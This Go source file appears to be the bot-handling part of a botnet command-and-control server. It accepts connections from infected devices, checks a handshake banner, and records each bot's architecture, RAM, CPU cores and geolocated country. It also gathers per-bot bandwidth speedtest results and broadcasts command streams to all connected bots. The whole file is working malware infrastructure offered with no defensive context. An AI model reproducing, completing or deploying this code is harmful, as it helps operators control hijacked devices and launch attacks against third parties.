package main

import (
	"encoding/binary"
	"log"
	"net"
	"sync"
	"time"

	lru "github.com/hashicorp/golang-lru"
	"github.com/oschwald/geoip2-golang"
)

// Slave will start the main slave process
func Slave() error {
	listener, err := net.Listen(Options.Templates.Slaves.Protocol, Options.Templates.Slaves.Listener)
	if err != nil {
		return err
	}

	log.Printf("\x1b[48;5;10m\x1b[38;5;16m Success \x1b[0m Bot server started on port > [%s]\r\n", Options.Templates.Slaves.Listener)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go Handle(conn)
	}
}

var (
	speedtestActive    bool
	speedtestTotalMbps float64
	speedtestCount     int
	speedtestResults   map[int]uint32
	speedtestMutex     sync.RWMutex
)

// Variables globales para GeoIP
var (
	geoipReader  *geoip2.Reader
	countryCache *lru.Cache // IP -> cachedCountry
)

// cachedCountry is a simple struct to store country code and name in the LRU cache.
type cachedCountry struct {
	Code string
	Name string
}

// init initializes the speedtest results map.
func init() {
	speedtestResults = make(map[int]uint32)
}

// initGeoIP initializes the GeoIP reader and the LRU cache for country lookups.
func initGeoIP() error {
	var err error
	geoipReader, err = geoip2.Open("geoip/GeoLite2-Country.mmdb")
	if err != nil {
		log.Printf("Warning: Could not load GeoIP database: %v. Country stats will be unavailable.", err)
		geoipReader = nil
		return nil // o return err según se quiera
	}
	countryCache, err = lru.New(10000)
	if err != nil {
		return err
	}
	return nil
}

// getCountry returns the country code and name for a given IP address, using GeoIP2 and caching results.
func getCountry(ipStr string) (code, name string) {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return "Invalid", "Invalid"
	}
	if ip.IsPrivate() {
		return "Private", "Private"
	}

	// Caché
	if val, ok := countryCache.Get(ipStr); ok {
		c := val.(cachedCountry)
		return c.Code, c.Name
	}

	if geoipReader == nil {
		return "NoDB", "NoDB"
	}

	record, err := geoipReader.Country(ip)
	if err != nil {
		return "Error", "Error"
	}
	code = record.Country.IsoCode
	name = record.Country.Names["en"]
	if code == "" {
		code = "Unknown"
		name = "Unknown"
	}

	countryCache.Add(ipStr, cachedCountry{Code: code, Name: name})
	return code, name
}

type Client struct {
	CID         int
	Version     byte
	Source      string
	Arch        string
	TotalRAM    uint32
	CPUCores    uint8
	CountryCode string // código ISO, ej. "KE"
	CountryName string // nombre en inglés, ej. "Kenya"
	Conn        net.Conn
	Stream      chan []byte
}

// Handle will handle the new possible device connection.

func Handle(conn net.Conn) {
	defer conn.Close()

	time.Sleep(1 * time.Second)

	// Leer handshake: 4 bytes banner + 1 byte len + hasta 64 de arquitectura
	buf := make([]byte, 4+1+64)
	n, err := conn.Read(buf)
	if err != nil || n < 5 {
		return
	}

	// Verificar banner
	for i, block := range Banner {
		if i >= n || buf[i] != block {
			return
		}
	}

	// Leer longitud de la arquitectura
	archLen := int(buf[4])
	if archLen < 1 || archLen > 64 || 5+archLen > n {
		// No hay suficientes datos -> cerrar conexión
		return
	}
	arch := string(buf[5 : 5+archLen])

	// ... después de arch := string(buf[5:5+archLen])

	// Leer RAM (4 bytes)
	if n < 5+archLen+4 {
		return
	}
	ram := binary.BigEndian.Uint32(buf[5+archLen : 5+archLen+4])

	// Leer CPU cores (1 byte)
	if n < 5+archLen+4+1 {
		return
	}
	cores := buf[5+archLen+4]

	remoteIP, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		remoteIP = "0.0.0.0"
	}

	countryCode, countryName := getCountry(remoteIP)

	New := &Client{
		Conn:        conn,
		Stream:      make(chan []byte),
		Source:      arch,
		Arch:        arch,
		TotalRAM:    ram,
		CPUCores:    cores,
		CountryCode: countryCode,
		CountryName: countryName,
		Version:     0,
	}

	AddClient(New)
	defer RemoveClient(New)

	go func(conn net.Conn, client *Client) {
		for {
			var op [1]byte
			if _, err := conn.Read(op[:]); err != nil {
				return
			}
			switch op[0] {
			case 0x66: // reporte de velocidad
				var speedFixed uint32
				if err := binary.Read(conn, binary.BigEndian, &speedFixed); err != nil {
					return
				}
				speedMbps := float64(speedFixed) / 10.0
				speedtestMutex.Lock()
				if speedtestActive {
					speedtestTotalMbps += speedMbps
					speedtestCount++
					speedtestResults[client.CID] = speedFixed
				}
				speedtestMutex.Unlock()
			}
		}
	}(conn, New)

	ticker := time.NewTicker(time.Second)
	cancel := make(chan bool)
	conns := 0

	for {
		select {
		case n := <-cancel:
			if !n {
				continue
			}
			return
		case <-ticker.C:
			conn.SetReadDeadline(time.Now().Add(120 * time.Second))
			if conns > 0 {
				continue
			}
			go func(conn net.Conn) {
				conns++
				defer func() { conns-- }()
				buf := make([]byte, 1)
				conn.SetReadDeadline(time.Now().Add(180 * time.Second))
				if _, err := conn.Read(buf); err != nil {
					cancel <- true
					return
				}
				conn.SetReadDeadline(time.Now().Add(120 * time.Second))
				if _, err := conn.Write(buf); err != nil {
					cancel <- true
					return
				}
			}(conn)
		case broadcast := <-New.Stream:
			if _, err := conn.Write(broadcast); err != nil {
				return
			}
		}
	}
}
